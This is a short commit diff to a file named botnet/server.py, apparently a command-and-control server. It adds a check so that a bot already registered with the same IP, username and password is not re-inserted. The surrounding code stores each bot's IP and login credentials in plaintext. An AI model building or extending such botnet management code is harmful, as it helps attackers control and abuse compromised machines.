added the username and password check

+++ botnet/server.py
@@ -101,6 +101,8 @@ def addbot():
     j = request.get_json()
     val = bots_table.find_one({"ip":j['ip']})
     if(val is not None):
+        if(val["username"] == j['username'] and val["password"] == j['password']):
+            return jsonify({'code':200,'data':"already exists"})
         bots_table.delete_one({"ip":j['ip']})
     nextId = getNextSequence(counter,"botId")  
     result=bots_table.insert_one({'botId':nextId,"ip":j['ip'],"username":j['username'],"password":j['password'],"loaded":0,"directoryName":""})
